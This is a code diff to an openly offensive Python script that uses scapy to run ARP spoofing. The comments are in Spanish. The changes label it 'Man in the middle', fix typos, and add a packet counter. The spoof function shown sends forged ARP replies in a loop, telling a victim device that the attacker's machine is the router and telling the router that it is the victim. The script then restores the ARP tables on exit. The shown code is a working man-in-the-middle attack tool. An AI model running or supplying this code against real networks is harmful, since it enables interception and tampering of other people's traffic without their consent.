@@ -27,11 +27,12 @@ def restore(destinationIp, sourceIp):
     scapy.send(packet, count=4, verbose=False)
    
 
+#Man in the middle
 def spoof(targetIp, spoofIp):
     '''
     Enviaremos un paquete ARP a la victima haciendole creer que nuestra maquina es el router
     En los parametros 'pdst' y 'hwdst' ingresaremos la ip y mac del dispositivo al que queremos atacar
-    En 'psrc' ingresaremos la direcciòn de nustro puerto (Gateway): sudo route -n
+    En 'psrc' ingresaremos la dirección de nustro puerto (Gateway): sudo route -n
     '''
     targetMac = getMac(targetIp)
     packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIp)
@@ -49,10 +50,12 @@ try:
     while True:
         spoof(ips.targetIp, ips.gatewayIp) #Le decimos al dispositivo atacado que somos el router
         spoof(ips.gatewayIp, ips.targetIp) #Le decimos al router que somos el dispositivo atacado
+        sentPackets += 2
+        print('\rPaquetes enviados: ' + str(sentPackets), end= '')
         time.sleep(2)
 
 except KeyboardInterrupt: 
-    print('\nFializando ejecución...Limpiando tablas ARP...')
+    print('\nFinalizando ejecución... Limpiando tablas ARP...')
     restore(ips.targetIp, ips.gatewayIp)
     restore(ips.gatewayIp, ips.targetIp)
     print('Programa finalizado')
